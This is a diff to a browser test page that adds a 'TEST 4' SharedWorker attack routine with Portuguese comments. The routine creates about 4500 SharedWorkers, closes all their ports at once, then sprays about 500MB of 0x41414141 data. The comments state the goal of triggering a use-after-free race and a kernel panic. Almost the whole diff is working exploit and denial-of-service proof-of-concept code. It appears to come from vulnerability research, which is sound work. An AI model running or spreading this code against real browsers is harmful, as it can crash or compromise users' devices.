@@ -110,6 +110,7 @@
 	    <button onclick="runSharedWorkerRace()">TEST 1: SharedWorker Race (Create/Kill Loop)</button>
         <button onclick="runWorkerHeapSpray()">TEST 2: SharedWorker UAF + Heap Spray (0x41414141)</button>
         <button onclick="runGCPressure()">TEST 3: SharedWorker + GC Pressure (Memory Spike)</button>
+        <button onclick="runExplosiveCleanup()">TEST 4: SharedWorker Flood + Explicit Destruction</button>
     
 
 	
@@ -3164,10 +3165,86 @@ function runGridExplosion() {
             }
         }, 2000);
     }
+
+function runExplosiveCleanup() {
+        log("[EXPLOSIVE] Iniciando Flood com Gatilho de Destruição...");
+        
+        if (!window.SharedWorker) {
+            log("SharedWorker não suportado.");
+            return;
+        }
+        
+        // Mantém referência para poder matar depois
+        let workers = []; 
+        let count = 0;
+        
+        const interval = setInterval(() => {
+            // Cria em lotes pequenos para ter controle
+            for(let i=0; i<10; i++) {
+                try {
+                    // Cria o worker
+                    const sw = new SharedWorker("data:text/javascript,onconnect=function(e){}", "bomb_" + count);
+                    // Inicia a porta (importante para o kernel alocar o IPC)
+                    sw.port.start();
+                    workers.push(sw);
+                    count++;
+                } catch(e) {
+                    clearInterval(interval);
+                    log("Erro antes do gatilho: " + e.message);
+                    return;
+                }
+            }
+            
+            if (count % 100 === 0) log(`Workers ativos: ${count}`);
+            
+            // GATILHO: Chegamos na "Zona de Perigo" (4500)
+            // Não esperamos chegar em 5000 para não travar o loop, queremos comandar a destruição.
+            if (count >= 4500) {
+                clearInterval(interval);
+                triggerMassDestruction(workers);
+            }
+        }, 5);
+    }
+
+    function triggerMassDestruction(workersList) {
+        log("!!! GATILHO ATIVADO: Iniciando Destruição em Massa !!!");
+        log("Tentando fechar 4500 portas simultaneamente...");
+
+        // 1. O Golpe: Fecha explicitamente todas as conexões IPC
+        // Se houver um bug de UAF, o Kernel pode se perder aqui ao tentar fechar tantos handles.
+        try {
+            for (let i = 0; i < workersList.length; i++) {
+                workersList[i].port.close();
+            }
+        } catch(e) {
+            log("Erro durante o fechamento: " + e.message);
+        }
+
+        // 2. Dereferência: Diz ao JS "não preciso mais disso"
+        workersList = null; 
+
+        log("Portas fechadas. Forçando Garbage Collection via Alocação...");
+
+        // 3. Pressão de Memória: Obriga o Kernel a reutilizar o espaço que acabamos de liberar
+        // Se o espaço ainda estiver sendo usado (Race Condition), isso causa o Panic.
+        setTimeout(() => {
+            try {
+                const pressure = [];
+                // Aloca 500MB de "Lixo" (0x41)
+                const chunk = new Uint32Array(1024 * 256).fill(0x41414141);
+                for(let i=0; i<500; i++) {
+                    pressure.push(chunk.slice(0));
+                }
+                log("Memória alocada. Se você ler isso, o Kernel resistiu.");
+            } catch(e) {
+                log("OOM durante pressão (Esperado).");
+            }
+        }, 100);
+    }
+
     </script>
 </body>
 </html>
-
 
 
 
